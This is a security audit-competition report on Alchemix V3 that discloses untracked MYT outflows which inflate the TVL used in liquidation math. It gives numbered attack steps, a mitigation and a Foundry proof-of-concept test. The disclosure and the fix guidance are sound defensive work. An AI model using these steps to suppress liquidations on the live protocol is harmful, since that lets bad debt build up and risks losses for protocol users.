# 57447 sc high untracked myt outflows inflate tvl causing liquidation suppression

**Submitted on Oct 26th 2025 at 10:00:39 UTC by @riptide for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57447
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

The bug causes `_mytSharesDeposited` to not decrement during MYT outflows in `_forceRepay` and `_doLiquidation`, inflating the tracked TVL used in liquidation calculations.

If exploited on mainnet, this could suppress full liquidations of undercollateralized positions, allowing bad debt to persist, increasing insolvency risk, and potentially leading to significant financial losses for the protocol and its users as the discrepancy compounds with repeated liquidations.

## Vulnerability Details

`_mytSharesDeposited` is used as the TVL source for liquidation math:

```solidity
// src/AlchemistV3.sol
uint256 private _mytSharesDeposited;

function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
    uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesDeposited);
    totalUnderlyingValue = yieldTokenTVLInUnderlying;
}
```

It directly feeds `alchemistCurrentCollateralization`:

```solidity
// src/AlchemistV3.sol
(liquidationAmount, debtToBurn, baseFee, outsourcedFee) = calculateLiquidation(
    collateralInUnderlying,
    account.debt,
    minimumCollateralization,
    normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt,
    globalMinimumCollateralization,
    liquidatorFee
);
```

Correct paths adjust `_mytSharesDeposited` on inflow/outflow:

```solidity
// deposit: increments
TokenUtils.safeTransferFrom(myt, msg.sender, address(this), amount);
_mytSharesDeposited += amount;

// withdraw: decrements
TokenUtils.safeTransfer(myt, recipient, amount);
_mytSharesDeposited -= amount;

// redeem: decrements both transfers
TokenUtils.safeTransfer(myt, transmuter, collRedeemed);
TokenUtils.safeTransfer(myt, protocolFeeReceiver, feeCollateral);
_mytSharesDeposited -= collRedeemed + feeCollateral;
```

Bug: internal outflows do not decrement `_mytSharesDeposited`:

```solidity
// src/AlchemistV3.sol::_forceRepay
// sends MYT out, but never: _mytSharesDeposited -= protocolFeeTotal/creditToYield
TokenUtils.safeTransfer(myt, protocolFeeReceiver, protocolFeeTotal);
...
TokenUtils.safeTransfer(myt, address(transmuter), creditToYield);
```

```solidity
// src/AlchemistV3.sol::_doLiquidation
// sends MYT out, but never decrements _mytSharesDeposited
TokenUtils.safeTransfer(myt, transmuter, amountLiquidated - feeInYield);
if (feeInYield > 0 && account.collateralBalance >= feeInYield) {
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
}
```

Result: contract’s real MYT balance drops while `_mytSharesDeposited` stays inflated, overstating TVL and the global ratio used by `calculateLiquidation`, suppressing liquidation severity/paths.

### Attack Steps

1. Create a position: call `AlchemistV3.deposit(C, attacker, 0)` then `AlchemistV3.mint(tokenIdP, D, attacker)` to raise `totalDebt`; `_mytSharesDeposited += C`.
2. Create redemption demand: approve `debtToken`, call `Transmuter.createRedemption(R ≤ D)` to drive earmarking over blocks.
3. Wait ≥1 block; trigger liquidation: a bot or attacker calls `AlchemistV3.liquidate(tokenIdP)`.
4. Inside `liquidate`, `_forceRepay(tokenIdP, account.earmarked)` transfers MYT to `transmuter` and `protocolFeeReceiver` without decrementing `_mytSharesDeposited`.
5. If still below bound, `_doLiquidation` transfers `(amountLiquidated - feeInYield)` to `transmuter` and `feeInYield` to caller, again without decrementing `_mytSharesDeposited`.
6. Repeat step 3–5 across accounts to accumulate drift: actual MYT at `address(this)` decreases; `_mytSharesDeposited` remains high; `totalDebt` often decreases.
7. Open a large undercollateralized position `tokenIdQ` and let it fall below `collateralizationLowerBound`.
8. When anyone calls `AlchemistV3.liquidate(tokenIdQ)`, the inflated `_mytSharesDeposited` yields an artificially high `alchemistCurrentCollateralization`, preventing the full-liquidation branch; only partial liquidation occurs.

## Likelihood (high)

Any address can call `AlchemistV3.liquidate`/`batchLiquidate` on accounts that naturally become undercollateralized or have earmarked debt; no roles or capital needed. Liquidations occur routinely, are profitable via fees, and repeatedly trigger the buggy outflows.

Preconditions (positions below `collateralizationLowerBound`, earmarking active) arise in normal operation, especially during volatility. Execution is trivial and repeatable; the drift compounds steadily.

## Impact (critical)

Inflated `alchemistCurrentCollateralization` suppresses the `alchemistCurrentCollateralization < globalMinimumCollateralization` full-liquidation path and reduces liquidation sizes, allowing severely undercollateralized positions to persist.

The deviation equals the cumulative MYT transferred but not decremented (sum of `creditToYield`, `protocolFeeTotal`, `amountLiquidated - feeInYield`, and `feeInYield`), enabling large positions to avoid full liquidation and increasing systemic insolvency risk across all accounts.

## Mitigation

Implement both: (a) make `AlchemistV3._getTotalUnderlyingValue` use `IERC20(myt).balanceOf(address(this))` (then convert to underlying) instead of `_mytSharesDeposited` to guarantee liquidation correctness; (b) decrement `_mytSharesDeposited` on every MYT outflow: in `_forceRepay` after transfers of `protocolFeeTotal` and `creditToYield`; in the repayment-only path of `liquidate` after paying `feeInYield`; and in `_doLiquidation` after transfers of `(amountLiquidated - feeInYield)` and `feeInYield`. Keep decrements inside the same conditionals as the transfers and assert `_mytSharesDeposited >= amount` before subtraction.

## Proof of Concept

## Proof of Concept

Add to `test/AlchemistV3.t.sol`

```
function testPOC_UntrackedMYTOutflowsInflateTVL() external {
    // Setup: ensure MYT (vault) has supply and price control
    vm.startPrank(someWhale);
    IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
    vm.stopPrank();

    // Step 1: Create a position for 0xbeef and borrow near max
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
    alchemist.deposit(depositAmount, address(0xbeef), 0);
    uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    uint256 maxBorrow = alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
    alchemist.mint(tokenId, maxBorrow, address(0xbeef));
    vm.stopPrank();

    // Step 2: Create redemption demand to generate earmarked debt  
    vm.startPrank(address(0xdad));
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), maxBorrow / 2);
    transmuterLogic.createRedemption(maxBorrow / 2);
    vm.stopPrank();

    // Step 3: Let earmarking progress 
    vm.roll(block.number + (5_256_000 / 2));
    
    // Step 4: Drop the share price to make the position undercollateralized
    // This is the key - increase yield token supply to reduce share price (more shares, same underlying)
    uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
    // Increase yield token supply by ~10% to reduce share price by ~10%
    // This will push collateralization below the 1.05x threshold
    uint256 modifiedVaultSupply = (initialVaultSupply * 1000 / 10_000) + initialVaultSupply; // +10%
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);
    
    // Step 5: Record pre-liquidation tracked vs actual underlying TVL
    uint256 mytBalBefore = IERC20(address(vault)).balanceOf(address(alchemist));
    uint256 trackedUnderlyingBefore = alchemist.getTotalUnderlyingValue();
    uint256 actualUnderlyingBefore = alchemist.convertYieldTokensToUnderlying(mytBalBefore);

    // Sanity: before any untracked outflow, tracked and actual should match (or be within rounding)
    assertApproxEqAbs(trackedUnderlyingBefore, actualUnderlyingBefore, 1, "pre: tracked != actual underlying");

    // Step 6: Trigger liquidation on the undercollateralized position
    // This will transfer MYT out of the Alchemist (to the Transmuter and/or Liquidator) via _forceRepay/_doLiquidation
    // without decrementing _mytSharesDeposited (the internal TVL tracker).
    vm.prank(externalUser);
    alchemist.liquidate(tokenId);

    // Step 7: Record post-liquidation tracked vs actual underlying TVL
    uint256 mytBalAfter = IERC20(address(vault)).balanceOf(address(alchemist));
    uint256 trackedUnderlyingAfter = alchemist.getTotalUnderlyingValue();
    uint256 actualUnderlyingAfter = alchemist.convertYieldTokensToUnderlying(mytBalAfter);

    // Assert that actual MYT balance decreased (tokens flowed out)
    assertLt(mytBalAfter, mytBalBefore, "post: MYT balance should decrease due to outflows");

    // Assert that actual underlying decreased accordingly
    assertLt(actualUnderlyingAfter, actualUnderlyingBefore, "post: actual underlying should decrease");

    // Critical POC assertion:
    // Because outflows were not tracked in _mytSharesDeposited, tracked underlying stayed inflated.
    // So trackedUnderlyingAfter should be strictly greater than actualUnderlyingAfter.
    assertGt(trackedUnderlyingAfter, actualUnderlyingAfter, "post: tracked underlying remains inflated vs. actual");

    // Optional: also show that tracked value did not decrease as much as actual (or at all)
    // This highlights the drift on the TVL used for liquidation math.
    assertGe(trackedUnderlyingAfter, trackedUnderlyingBefore - 1, "post: tracked underlying unexpectedly decreased");
}
```
